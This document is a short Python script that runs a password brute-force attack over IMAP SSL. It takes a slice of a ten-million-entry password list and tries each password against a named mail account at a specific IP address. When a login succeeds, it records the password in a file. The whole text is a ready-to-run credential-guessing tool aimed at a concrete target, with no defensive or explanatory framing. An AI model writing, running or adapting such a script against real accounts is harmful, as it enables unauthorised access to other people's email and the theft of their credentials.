import imaplib,sys,time
start=int(sys.argv[1]); count=int(sys.argv[2])
pw=[l.rstrip('\n') for l in open('pw10m.txt')][start:start+count]
for p in pw:
    try:
        m=imaplib.IMAP4_SSL('141.8.192.100',993,timeout=12); m.login('list@rewood.group',p); m.logout()
        print(f'IMAPHIT {p}',flush=True); open('HIT_IMAP.txt','w').write(p+'\n'); sys.exit(0)
    except imaplib.IMAP4.error: pass
    except Exception: time.sleep(0.2)
print('IMAPDONE',start,flush=True)
